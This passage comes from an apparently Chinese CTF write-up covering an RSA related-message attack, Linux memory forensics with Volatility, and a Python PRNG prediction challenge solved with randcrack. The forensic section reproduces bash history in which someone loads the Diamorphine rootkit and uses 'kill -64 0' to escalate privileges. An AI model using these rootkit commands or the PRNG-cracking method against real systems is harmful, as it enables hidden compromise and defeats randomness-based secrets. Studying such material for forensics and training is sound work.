class="line"></span><br><span class="line">    <span class="attribute">m1</span> = related_message_attack(c<span class="number">1</span>, c<span class="number">2</span>, diff, e, n)</span><br><span class="line">    <span class="attribute">print</span>(binascii.unhexlify(hex(m<span class="number">1</span>)[<span class="number">2</span>:]))</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h2 id="0x03-backdoor"><a href="#0x03-backdoor" class="headerlink" title="0x03 backdoor"></a>0x03 backdoor</h2><p>被坑时间最长的取证，volatility的profile最初找了好多现有的都不行，然后linux_recover_filesystem还报错，github上还没解决方法。。。还好为了要profile需要建一个新虚拟机，索性重新clone了volatility配置python2在ubuntu16.04.3server跑了，结果就没啥问题。。。</p><p>开局去拿ubuntu16.04.3server的profile。</p><p>生成方式：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install dwarfdump build-essential libelf-dev zip</span><br><span class="line">git clone https:<span class="comment">//github.com/volatilityfoundation/volatility.git</span></span><br><span class="line">cd volatility/tools/linux</span><br><span class="line">make</span><br><span class="line">sudo zip <span class="constructor">$(<span class="params">lsb_release</span> -<span class="params">i</span> -<span class="params">s</span>)</span><span class="constructor">_$(<span class="params">uname</span> -<span class="params">r</span>)</span><span class="module-access"><span class="module"><span class="identifier">_profile</span>.</span></span>zip <span class="keyword">module</span>.dwarf /boot/<span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>map-<span class="constructor">$(<span class="params">uname</span> -<span class="params">r</span>)</span></span><br></pre></td></tr></table></figure><p>由于是linux取证，只能是那些带linux_的插件好使了。</p><p>先看了下bash_history:</p><p>volatility -f ./misc_backdoor.vmem  –profile=LinuxUbuntu_4_4_0-87-generic_profilex64 linux_bash</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-- -------------------- ------------------------------ -------</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:03 UTC<span class="string">+0000</span>   cp ./diamorphine.ko /tmp/</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:06 UTC<span class="string">+0000</span>   cd ..</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:43 UTC<span class="string">+0000</span>   ls</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:50 UTC<span class="string">+0000</span>   rm -rf ./Diamorphine</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:52 UTC<span class="string">+0000</span>   ls</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:52 UTC<span class="string">+0000</span>   cd /</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:56 UTC<span class="string">+0000</span>   cd tmp/</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:56 UTC<span class="string">+0000</span>   ls</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:43:04 UTC<span class="string">+0000</span>   sudo insmod diamorphine.ko </span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:43:31 UTC<span class="string">+0000</span>   kill <span class="string">-64</span> 0</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:43:33 UTC<span class="string">+0000</span>   whoami</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:43:34 UTC<span class="string">+0000</span>   ls</span><br></pre></td></tr></table></figure><p>发现加载了一个内核模块，然后还把编译的文件夹删了。但是可以看出来这个diamorphine.ko应该在tmp文件夹下所以他才会直接在tmp下insmod.</p><p>复制文件系统到本地：</p><p>volatility -f ./misc_backdoor.vmem  –profile=LinuxUbuntu_4_4_0-87-generic_profilex64 linux_recover_filesystem -D ./</p><p>然后把虚拟机里的/tmp下的次rootkit恶意文件拿出来，ida64一下，字符串直接由flag:</p><p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1629770630779.png" alt="1629770630779"></p><h2 id="0x04-prophet"><a href="#0x04-prophet" class="headerlink" title="0x04 prophet"></a>0x04 prophet</h2><p>一个靠预测随机数确定下一个zip包解压密码不断解压的题，脚本循环获取名字解压下一个zip。但是只给1000个。</p><p>这个最初不知道该怎么做到随机数预测，就查prophet，结果有这个包，然后直接误入歧途了。。。研究了半天没发现这库能做这题的随机数预测。。。后来看大佬博客是randcrack库。</p><p>这个库github上可以找到说明和例子，<a href="https://github.com/tna0y/Python-random-module-cracker">https://github.com/tna0y/Python-random-module-cracker</a></p><p>主要就是创建对象后用submit函数吞入，总共能吞624个，满了就进不去了，所以每次拿倒数624个做下一个随机数预测，以此类推。每次出来的都是unknown.zip，改个名继续解。又解了1000次出现flag文件。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-<span class="number">8</span></span><br><span class="line">#python3</span><br><span class="line">#set <span class="number">2907706324</span>.zip in ./</span><br><span class="line">import zipfile</span><br><span class="line">import os</span><br><span class="line">import random</span><br><span class="line">from randcrack import RandCrack</span><br><span class="line"></span><br><span class="line">def getname():</span><br><span class="line">    l = os.listdir()</span><br><span class="line">    for i in l:</span><br><span class="line">        if &quot;.zip&quot; in i and &quot;unknown&quot; not in i:</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">def randcrack(nums):</span><br><span class="line">    # need <span class="number">624</span> nums</span><br><span class="line">    #submitting <span class="number">624</span> integers it won&#x27;t take any more and will be ready for predicting new numbers.</span><br><span class="line">    #while it is full,it will not swallow in a new one,we should restart.</span><br><span class="line">    rc = RandCrack()</span><br><span class="line">    for i in range(<span class="number">624</span>):</span><br><span class="line">        num = nums[i]</span><br><span class="line">        rc.submit(num)</span><br><span class="line">    predict = rc.predict_randrange(<span class="number">0</span>,<span class="number">4294967295</span>)</span><br><span class="line">    return str(predict)</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">names = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># <span class="number">1000</span> nums get</span><br><span class="line">file = open(&#x27;data.txt&#x27;,&#x27;a+&#x27;) </span><br><span class="line">while count != <span class="number">1000</span>:</span><br><span class="line">    name = getname()</span><br><span class="line">    if name:</span><br><span class="line">        zip_file = zipfile.ZipFile(name)</span><br><span class="line">        zip_list = zip_file.namelist()</span><br><span class="line">        for f in zip_list:</span><br><span class="line">            zip_file.extract(f, r&#x27;./&#x27;, pwd=name[:-<span class="number">4</span>].encode(&quot;utf-<span class="number">8</span>&quot;))  # 循环解压文件到指定目录</span><br><span class="line">        zip_file.close()  # 关闭文件，必须有，释放内存</span><br><span class="line">        names.append(int(name[:-<span class="number">4</span>]))</span><br><span class="line">        os.remove(name)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        file.write(name[:-<span class="number">4</span>])</span><br><span class="line">        file.write(&#x27;,&#x27;)</span><br><span class="line">        print(&quot;count = &quot;,count,&quot;name = &quot;,name[:-<span class="number">4</span>],&quot;hex = &quot;,hex(int(name[:-<span class="number">4</span>])))</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;end or something wrong&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">#start unknown.zip</span><br><span class="line">nums = [<span class="number">2907706324</span>,<span class="number">3954914986</span>,<span class="number">3402108112</span>,<span class="number">2054213659</span>,<span class="number">535557466</span>,<span class="number">3669544554</span>,<span class="number">2651712950</span>,<span class="number">3417770286</span>,<span class="number">4111425735</span>,<span class="number">3450915372</span>,<span class="number">3509237967</span>,<span class="number">2707743668</span>,<span class="number">889955106</span>,<span class="number">101861478</span>,<span class="number">1336215387</span>,<span class="number">3605515990</span>,<span class="number">2504989551</span>,<span class="number">1349201253</span>,<span class="number">2648082710</span>,<span class="number">2601629531</span>,<span class="number">318049225</span>,<span class="number">645746114</span>,<span class="number">3181236701</span>,<span class="number">1354915347</span>,<span class="number">4222461704</span>,<span class="number">843752451</span>,<span class="number">304987850</span>,<span class="number">818779778</span>,<span class="number">2376864436</span>,<span class="number">4258684562</span>,<span class="number">3790514089</span>,<span class="number">2536866185</span>,<span class="number">3429670676</span>,<span class="number">700863894</span>,<span class="number">2368789662</span>,<span class="number">2954948787</span>,<span class="number">1850501693</span>,<span class="number">1935300318</span>,<span class="number">4294954886</span>,<span class="number">73605939</span>,<span class="number">790901430</span>,<span class="number">3142640071</span>,<span class="number">3691984007</span>,<span class="number">1373060993</span>,<span class="number">903416285</span>,<span class="number">3121969731</span>,<span class="number">1482630290</span>,<span class="number">3383153547</span>,<span class="number">4063302022</span>,<span class="number">3991027797</span>,<span class="number">4137420745</span>,<span class="number">3132346033</span>,<span class="number">1308129484</span>,<span class="number">3547926414</span>,<span class="number">3109764388</span>,<span class="number">708591644</span>,<span class="number">1817081225</span>,<span class="number">2668947004</span>,<span class="number">4263919904</span>,<span class="number">1115482359</span>,<span class="number">3856868064</span>,<span class="number">2830700281</span>,<span class="number">2281684679</span>,<span class="number">690656972</span>,<span class="number">1556659173</span>,<span class="number">3404632260</span>,<span class="number">3760484167</span>,<span class="number">1087153620</span>,<span class="number">4194906349</span>,<span class="number">1078862195</span>,<span class="number">2976233215</span>,<span class="number">1912726912</span>,<span class="number">30407312</span>,<span class="number">3942988489</span>,<span class="number">3908451981</span>,<span class="number">3898279239</span>,<span class="number">3281283879</span>,<span class="number">3497758064</span>,<span class="number">2782905320</span>,<span class="number">2430005846</span>,<span class="number">2035396750</span>,<span class="number">4225190092</span>,<span class="number">2269868098</span>,<span class="number">3586253265</span>,<span class="number">941460198</span>,<span class="number">714278381</span>,<span class="number">3535781796</span>,<span class="number">224084415</span>,<span class="number">1439629664</span>,<span class="number">4073938538</span>,<span class="number">3695945333</span>,<span class="number">3790821082</span>,<span class="number">1641312648</span>,<span class="number">3482321608</span>,<span class="number">3915303085</span>,<span class="number">1915159805</span>,<span class="number">3430976961</span>,<span class="number">1840044358</span>,<span class="number">3171835875</span>,<span class="number">2774047027</span>,<span class="number">1987332515</span>,<span class="number">3855846206</span>,<span class="number">2973653262</span>,<span class="number">3838867780</span>,<span class="number">611114104</span>,<span class="number">226329481</span>,<span class="number">1915513324</span>,<span class="number">3700256481</span>,<span class="number">43035897</span>,<span class="number">497049019</span>,<span class="number">4217044844</span>,<span class="number">2614275824</span>,<span class="number">744712097</span>,<span class="number">182795116</span>,<span class="number">2163976688</span>,<span class="number">4263470614</span>,<span class="number">725414906</span>,<span class="number">921626470</span>,<span class="number">3746191361</span>,<span class="number">1308296962</span>,<span class="number">1147642242</span>,<span class="number">4092217985</span>,<span class="number">3542284802</span>,<span class="number">1521845264</span>,<span class="number">2075371081</span>,<span class="number">816611597</span>,<span class="number">3041634562</span>,<span class="number">233907246</span>,<span class="number">1795167862</span>,<span class="number">3915308548</span>,<span class="number">491352142</span>,<span class="number">930583074</span>,<span class="number">1708980296</span>,<span class="number">308506013</span>,<span class="number">3810969309</span>,<span class="number">3157296753</span>,<span class="number">2967229333</span>,<span class="number">1571219325</span>,<span class="number">1291393249</span>,<span class="number">1593315655</span>,<span class="number">3882964486</span>,<span class="number">1017041435</span>,<span class="number">1857378099</span>,<span class="number">1824352034</span>,<span class="number">3349753470</span>,<span class="number">674061228</span>,<span class="number">1009504030</span>,<span class="number">2542637984</span>,<span class="number">371165771</span>,<span class="number">2479782679</span>,<span class="number">1480344967</span>,<span class="number">2869593526</span>,<span class="number">1330829984</span>,<span class="number">2722781682</span>,<span class="number">283801038</span>,<span class="number">3707346602</span>,<span class="number">4001933200</span>,<span class="number">2349491114</span>,<span class="number">1250027640</span>,<span class="number">1970245425</span>,<span class="number">171593507</span>,<span class="number">826464228</span>,<span class="number">2984624889</span>,<span class="number">1700335730</span>,<span class="number">1127890176</span>,<span class="number">2298521410</span>,<span class="number">3038015291</span>,<span class="number">3114969709</span>,<span class="number">2198496951</span>,<span class="number">3020449005</span>,<span class="number">2670289699</span>,<span class="number">1384619269</span>,<span class="number">691171966</span>,<span class="number">3223611927</span>,<span class="number">2151567537</span>,<span class="number">1625186327</span>,<span class="number">2435311123</span>,<span class="number">3729455475</span>,<span class="number">2620432733</span>,<span class="number">3211878875</span>,<span class="number">241902387</span>,<span class="number">422789850</span>,<span class="number">1633356868</span>,<span class="number">244191996</span>,<span class="number">499735365</span>,<span class="number">764962662</span>,<span class="number">1681584826</span>,<span class="number">427035682</span>,<span class="number">880783233</span>,<span class="number">1389830348</span>,<span class="number">1256307054</span>,<span class="number">1454192222</span>,<span class="number">3867551829</span>,<span class="number">1911723809</span>,<span class="number">394921086</span>,<span class="number">1072555848</span>,<span class="number">3834541849</span>,<span class="number">2720240412</span>,<span class="number">4083254853</span>,<span class="number">1463684341</span>,<span class="number">2807310132</span>,<span class="number">3989708760</span>,<span class="number">4287462606</span>,<span class="number">4065391879</span>,<span class="number">2946216593</span>,<span class="number">4274887668</span>,<span class="number">960363676</span>,<span class="number">3337566213</span>,<span class="number">2138750961</span>,<span class="number">3655949854</span>,<span class="number">138734513</span>,<span class="number">128284098</span>,<span class="number">1062990215</span>,<span class="number">3761988182</span>,<span class="number">1513533102</span>,<span class="number">845839023</span>,<span class="number">1734162676</span>,<span class="number">3029907057</span>,<span class="number">3437833787</span>,<span class="number">3858879164</span>,<span class="number">2270111112</span>,<span class="number">1830381909</span>,<span class="number">1534981723</span>,<span class="number">622364075</span>,<span class="number">2734894006</span>,<span class="number">3830057679</span>,<span class="number">550477468</span>,<span class="number">2555713963</span>,<span class="number">2687705967</span>,<span class="number">397294684</span>,<span class="number">3910881510</span>,<span class="number">3725223603</span>,<span class="number">2429728499</span>,<span class="number">1711990756</span>,<span class="number">4237787834</span>,<span class="number">2814436797</span>,<span class="number">2366793701</span>,<span class="number">868414597</span>,<span class="number">2185265697</span>,<span class="number">4003527750</span>,<span class="number">510159467</span>,<span class="number">281768698</span>,<span class="number">2839069975</span>,<span class="number">414584629</span>,<span class="number">841160842</span>,<span class="number">2248608666</span>,<span class="number">3581589648</span>,<span class="number">3224270545</span>,<span class="number">2113148121</span>,<span class="number">1552518857</span>,<span class="number">3606499351</span>,<span class="number">3204575349</span>,<span class="number">1595467803</span>,<span class="number">2880744010</span>,<span class="number">1317665514</span>,<span class="number">3437941254</span>,<span class="number">110923457</span>,<span class="number">278638319</span>,<span class="number">2683805720</span>,<span class="number">2816402957</span>,<span class="number">2117760685</span>,<span class="number">4054884851</span>,<span class="number">760362861</span>,<span class="number">2010439063</span>,<span class="number">3484464314</span>,<span class="number">302788119</span>,<span class="number">1394375925</span>,<span class="number">3571572324</span>,<span class="number">2666609477</span>,<span class="number">1853851652</span>,<span class="number">3970831431</span>,<span class="number">2738683685</span>,<span class="number">2259326865</span>,<span class="number">3704336022</span>,<span class="number">1519256231</span>,<span class="number">3644881529</span>,<span class="number">104403453</span>,<span class="number">1142252920</span>,<span class="number">2572082756</span>,<span class="number">2489933602</span>,<span class="number">2709723501</span>,<span class="number">186737154</span>,<span class="number">980884132</span>,<span class="number">1865172639</span>,<span class="number">2329728320</span>,<span class="number">3876911386</span>,<span class="number">3201931453</span>,<span class="number">2772783460</span>,<span class="number">661942251</span>,<span class="number">2402901175</span>,<span class="number">3570219339</span>,<span class="number">549076455</span>,<span class="number">1690874019</span>,<span class="number">2055566646</span>,<span class="number">2662268000</span>,<span class="number">4183765260</span>,<span class="number">1452482414</span>,<span class="number">2583855929</span>,<span class="number">948034686</span>,<span class="number">2853630447</span>,<span class="number">664902618</span>,<span class="number">2764279019</span>,<span class="number">740228037</span>,<span class="number">679334472</span>,<span class="number">1068533991</span>,<span class="number">1825024640</span>,<span class="number">105521362</span>,<span class="number">2758306319</span>,<span class="number">1561107818</span>,<span class="number">2855860411</span>,<span class="number">3944090887</span>,<span class="number">1155572417</span>,<span class="number">2222936476</span>,<span class="number">2982018743</span>,<span class="number">3826797015</span>,<span class="number">993277428</span>,<span class="number">3606014829</span>,<span class="number">2651099474</span>,<span class="number">183026480</span>,<span class="number">3850093664</span>,<span class="number">1946575336</span>,<span class="number">1458018383</span>,<span class="number">919408507</span>,<span class="number">3035932662</span>,<span class="number">666805284</span>,<span class="number">2368179406</span>,<span class="number">293503818</span>,<span class="number">306642195</span>,<span class="number">1174454622</span>,<span class="number">147082512</span>,<span class="number">3045274465</span>,<span class="number">1118557200</span>,<span class="number">2280283457</span>,<span class="number">1140154721</span>,<span class="number">1589304916</span>,<span class="number">2707734613</span>,<span class="number">2687607369</span>,<span class="number">3181595711</span>,<span class="number">1786880670</span>,<span class="number">614492265</span>,<span class="number">1727186681</span>,<span class="number">616992393</span>,<span class="number">2647336831</span>,<span class="number">1328574427</span>,<span class="number">3419233391</span>,<span class="number">86915267</span>,<span class="number">791316613</span>,<span class="number">2947942465</span>,<span class="number">1207262633</span>,<span class="number">4032471359</span>,<span class="number">110173792</span>,<span class="number">580028332</span>,<span class="number">3200100754</span>,<span class="number">1443892133</span>,<span class="number">4158469394</span>,<span class="number">2866259043</span>,<span class="number">1777066304</span>,<span class="number">2631121839</span>,<span class="number">3066797076</span>,<span class="number">913793049</span>,<span class="number">500723146</span>,<span class="number">4250565153</span>,<span class="number">3140000049</span>,<span class="number">4006124671</span>,<span class="number">1557687908</span>,<span class="number">3097026744</span>,<span class="number">1600577917</span>,<span class="number">3475167182</span>,<span class="number">4190641526</span>,<span class="number">1975505102</span>,<span class="number">2746146674</span>,<span class="number">4183482895</span>,<span class="number">3942160073</span>,<span class="number">1130897678</span>,<span class="number">655001677</span>,<span class="number">1503469355</span>,<span class="number">1589952677</span>,<span class="number">289068625</span>,<span class="number">404635291</span>,<span class="number">546675708</span>,<span class="number">4243969683</span>,<span class="number">92985514</span>,<span class="number">435955479</span>,<span class="number">2070686379</span>,<span class="number">269130310</span>,<span class="number">2458267416</span>,<span class="number">230795995</span>,<span class="number">2268807924</span>,<span class="number">4152347460</span>,<span class="number">883606733</span>,<span class="number">3649663604</span>,<span class="number">1939496305</span>,<span class="number">3144082131</span>,<span class="number">1020316188</span>,<span class="number">3643489526</span>,<span class="number">991785797</span>,<span class="number">2377699574</span>,<span class="number">1064114897</span>,<span class="number">3925872718</span>,<span class="number">3153908492</span>,<span class="number">3402689587</span>,<span class="number">729363836</span>,<span class="number">3146706653</span>,<span class="number">422102318</span>,<span class="number">781824325</span>,<span class="number">2070158255</span>,<span class="number">3452344097</span>,<span class="number">1855915077</span>,<span class="number">278758154</span>,<span class="number">2809776511</span>,<span class="number">3655551017</span>,<span class="number">1427426112</span>,<span class="number">3686861685</span>,<span class="number">1715461553</span>,<span class="number">3169333119</span>,<span class="number">400766497</span>,<span class="number">849152388</span>,<span class="number">3842058653</span>,<span class="number">3324504004</span>,<span class="number">2110816760</span>,<span class="number">1993886168</span>,<span class="number">2469709606</span>,<span class="number">1634363898</span>,<span class="number">451167479</span>,<span class="number">1791892046</span>,<span class="number">3639050937</span>,<span class="number">3326490342</span>,<span class="number">3138524672</span>,<span class="number">3683265170</span>,<span class="number">1733092879</span>,<span class="number">3943402096</span>,<span class="number">3178043886</span>,<span class="number">3263958674</span>,<span class="number">2945303049</span>,<span class="number">4030290823</span>,<span class="number">3890019934</span>,<span class="number">4072034359</span>,<span class="number">1491936406</span>,<span class="number">61358117</span>,<span class="number">3877008624</span>,<span class="number">4128962903</span>,<span class="number">3153897248</span>,<span class="number">2029311561</span>,<span class="number">1711005874</span>,<span class="number">1555958789</span>,<span class="number">2460011603</span>,<span class="number">1480475039</span>,<span class="number">2029023339</span>,<span class="number">3898772821</span>,<span class="number">813779337</span>,<span class="number">3274928705</span>,<span class="number">122738867</span>,<span class="number">326424966</span>,<span class="number">2636370832</span>,<span class="number">3504714095</span>,<span class="number">4243999766</span>,<span class="number">2552626959</span>,<span class="number">1698341626</span>,<span class="number">1110935776</span>,<span class="number">3393273826</span>,<span class="number">3735680822</span>,<span class="number">3013017650</span>,<span class="number">3968600483</span>,<span class="number">3916227526</span>,<span class="number">4062882707</span>,<span class="number">4124072198</span>,<span class="number">2274124478</span>,<span class="number">2769833441</span>,<span class="number">2147761328</span>,<span class="number">3979664881</span>,<span class="number">591506957</span>,<span class="number">1000835552</span>,<span class="number">1953837853</span>,<span class="number">3630957255</span>,<span class="number">1526381419</span>,<span class="number">1320001636</span>,<span class="number">804577210</span>,<span class="number">2780887882</span>,<span class="number">57522122</span>,<span class="number">2034965857</span>,<span class="number">1092740256</span>,<span class="number">3343601480</span>,<span class="number">316588755</span>,<span class="number">856922510</span>,<span class="number">3000844043</span>,<span class="number">277993279</span>,<span class="number">2628947374</span>,<span class="number">2800837999</span>,<span class="number">3540281314</span>,<span class="number">1131935058</span>,<span class="number">2554699772</span>,<span class="number">2983012006</span>,<span class="number">3462033745</span>,<span class="number">3747092723</span>,<span class="number">2082631046</span>,<span class="number">1249369550</span>,<span class="number">1399656050</span>,<span class="number">1380244778</span>,<span class="number">3654315687</span>,<span class="number">30864042</span>,<span class="number">3601038453</span>,<span class="number">1812382865</span>,<span class="number">3977191364</span>,<span class="number">3375851263</span>,<span class="number">2615653275</span>,<span class="number">4121914158</span>,<span class="number">4067727195</span>,<span class="number">4215992615</span>,<span class="number">50813272</span>,<span class="number">3422137608</span>,<span class="number">1214655257</span>,<span class="number">2262352860</span>,<span class="number">1445338275</span>,<span class="number">1049642872</span>,<span class="number">817141685</span>,<span class="number">3537094077</span>,<span class="number">1735027729</span>,<span class="number">4235889837</span>,<span class="number">2173890300</span>,<span class="number">4024475021</span>,<span class="number">435474311</span>,<span class="number">417920911</span>,<span class="number">2752551821</span>,<span class="number">10146419</span>,<span class="number">1584825302</span>,<span class="number">2581381951</span>,<span class="number">4078884446</span>,<span class="number">2091842886</span>,<span class="number">2635154217</span>,<span class="number">1512293963</span>,<span class="number">4240561542</span>,<span class="number">2569831040</span>,<span class="number">3062146866</span>,<span class="number">2413003376</span>,<span class="number">2056726083</span>,<span class="number">137699216</span>,<span class="number">2817513365</span>,<span class="number">847863437</span>,<span class="number">1348716639</span>,<span class="number">264518910</span>,<span class="number">1581262871</span>,<span class="number">3687371459</span>,<span class="number">4081927416</span>,<span class="number">3402250258</span>,<span class="number">1538729417</span>,<span class="number">58632833</span>,<span class="number">418582971</span>,<span class="number">3579226914</span>,<span class="number">1710281441</span>,<span class="number">3968026001</span>,<span class="number">3072229268</span>,<span class="number">3255655022</span>,<span class="number">443028273</span>,<span class="number">1781242768</span>,<span class="number">845963258</span>,<span class="number">1474822808</span>,<span class="number">2287289816</span>,<span class="number">3140795568</span>,<span class="number">647767985</span>,<span class="number">3201933540</span>,<span class="number">3344108747</span>,<span class="number">3156561341</span>,<span class="number">2135178605</span>,<span class="number">3977772423</span>,<span class="number">1091627310</span>,<span class="number">3387469991</span>,<span class="number">3480076167</span>,<span class="number">998455889</span>,<span class="number">3932962822</span>,<span class="number">556790737</span>,<span class="number">3462656387</span>,<span class="number">1354331856</span>,<span class="number">331339457</span>,<span class="number">89589652</span>,<span class="number">2169976628</span>,<span class="number">499723289</span>,<span class="number">4248480190</span>,<span class="number">459434352</span>,<span class="number">1756143408</span>,<span class="number">609517004</span>,<span class="number">1625850533</span>,<span class="number">1055607475</span>,<span class="number">4078436277</span>,<span class="number">178892738</span>,<span class="number">2639443481</span>,<span class="number">1643997964</span>,<span class="number">209795222</span>,<span class="number">4031695509</span>,<span class="number">515771499</span>,<span class="number">3844892252</span>,<span class="number">1509762710</span>,<span class="number">3467911440</span>,<span class="number">2990611802</span>,<span class="number">4108349538</span>,<span class="number">1251780874</span>,<span class="number">1275943948</span>,<span class="number">2750712131</span>,<span class="number">457664709</span>,<span class="number">1234644717</span>,<span class="number">3894274138</span>,<span class="number">779659511</span>,<span class="number">1022790972</span>,<span class="number">3587520181</span>,<span class="number">4114414679</span>,<span class="number">1788862106</span>,<span class="number">784942685</span>,<span class="number">2032827515</span>,<span class="number">97699241</span>,<span class="number">502970796</span>,<span class="number">208621053</span>,<span class="number">618199448</span>,<span class="number">869691038</span>,<span class="number">1315708708</span>,<span class="number">2950393537</span>,<span class="number">316695424</span>,<span class="number">3204417376</span>,<span class="number">2157414925</span>,<span class="number">1986435697</span>,<span class="number">578058463</span>,<span class="number">2226332610</span>,<span class="number">45889470</span>,<span class="number">1939749473</span>,<span class="number">4277520616</span>,<span class="number">716509244</span>,<span class="number">3148642698</span>,<span class="number">2619738742</span>,<span class="number">395812501</span>,<span class="number">2611816764</span>,<span class="number">120484619</span>,<span class="number">3803132111</span>,<span class="number">3028743725</span>,<span class="number">3032307726</span>,<span class="number">3558459801</span>,<span class="number">2286359562</span>,<span class="number">3242070811</span>,<span class="number">2972037405</span>,<span class="number">2409275190</span>,<span class="number">333056311</span>,<span class="number">1628673919</span>,<span class="number">1222753699</span>,<span class="number">3226124314</span>,<span class="number">510049636</span>,<span class="number">1798218781</span>,<span class="number">3286822755</span>,<span class="number">2050136383</span>,<span class="number">363266297</span>,<span class="number">753159469</span>,<span class="number">1339229922</span>,<span class="number">3282010884</span>,<span class="number">3964577747</span>,<span class="number">1183093495</span>,<span class="number">3665656653</span>,<span class="number">1802113568</span>,<span class="number">586211819</span>,<span class="number">1906435982</span>,<span class="number">407943402</span>,<span class="number">3478960696</span>,<span class="number">1221962222</span>,<span class="number">2646386190</span>,<span class="number">2344832406</span>,<span class="number">3568499138</span>,<span class="number">3479343149</span>,<span class="number">1044214259</span>,<span class="number">2255694969</span>,<span class="number">2629616514</span>,<span class="number">3767094630</span>,<span class="number">366310899</span>,<span class="number">2466889679</span>,<span class="number">2533941943</span>,<span class="number">2817371332</span>,<span class="number">478094315</span>,<span class="number">3077780922</span>,<span class="number">1917154805</span>,<span class="number">3668750533</span>,<span class="number">77295478</span>,<span class="number">258422916</span>,<span class="number">3929257613</span>,<span class="number">3653596300</span>,<span class="number">749676172</span>,<span class="number">2250390103</span>,<span class="number">1052624843</span>,<span class="number">2563981631</span>,<span class="number">519704737</span>,<span class="number">2969422268</span>,<span class="number">1628120157</span>,<span class="number">4100859626</span>,<span class="number">252141936</span>,<span class="number">2978131799</span>,<span class="number">1142247725</span>,<span class="number">3804721174</span>,<span class="number">1356078034</span>,<span class="number">1198864435</span>,<span class="number">2564872115</span>,<span class="number">3858385849</span>,<span class="number">3652532995</span>,<span class="number">305266060</span>,<span class="number">482238871</span>,<span class="number">1451662628</span>,<span class="number">2189662472</span>,<span class="number">4225060244</span>,<span class="number">3266478407</span>,<span class="number">298473768</span>,<span class="number">1328477173</span>,<span class="number">1872099590</span>,<span class="number">380059855</span>,<span class="number">912553536</span>,<span class="number">2099522339</span>,<span class="number">3224313555</span>,<span class="number">2056296410</span>,<span class="number">477848639</span>,<span class="number">379190417</span>,<span class="number">3487993484</span>,<span class="number">3121969521</span>,<span class="number">2288925162</span>,<span class="number">3077843604</span>,<span class="number">1456549673</span>,<span class="number">1304340342</span>,<span class="number">2083447579</span>,<span class="number">3167117719</span>,<span class="number">3348095325</span>,<span class="number">2268107766</span>,<span class="number">1402643313</span>,<span class="number">2397212057</span>,<span class="number">1352006746</span>,<span class="number">231921187</span>,<span class="number">1313920238</span>,<span class="number">2168273889</span>,<span class="number">805130323</span>,<span class="number">2816803714</span>,<span class="number">3720840652</span>,<span class="number">3407591957</span>,<span class="number">479785258</span>,<span class="number">1217833088</span>,<span class="number">4229273758</span>,<span class="number">587760181</span>,<span class="number">1233711591</span>,<span 